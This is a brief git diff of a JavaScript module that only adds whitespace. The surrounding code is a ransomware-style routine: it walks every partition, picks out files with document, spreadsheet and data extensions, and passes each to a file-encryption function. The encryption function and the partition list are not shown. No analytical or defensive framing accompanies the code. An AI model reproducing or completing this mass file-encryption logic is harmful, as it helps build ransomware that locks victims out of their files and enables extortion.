@@ -35,10 +35,15 @@ var ext = [".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".x
            ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".xqx"];
 
 module.exports.start = function () {
+
     for (var partition of virtualPartitions) {
+
         if (fs.existsSync(partition)) {
+
             Search.walk(partition, function (filePath) {
+
                 if (endsWithAny(ext, filePath)) {
+
                     Encryption.fileEncryption(filePath)
                 }
             });
@@ -47,7 +52,9 @@ module.exports.start = function () {
 }
 
 function endsWithAny(suffixes, string) {
+
     return suffixes.some(function (suffix) {
+
         return string.endsWith(suffix);
     });
 }
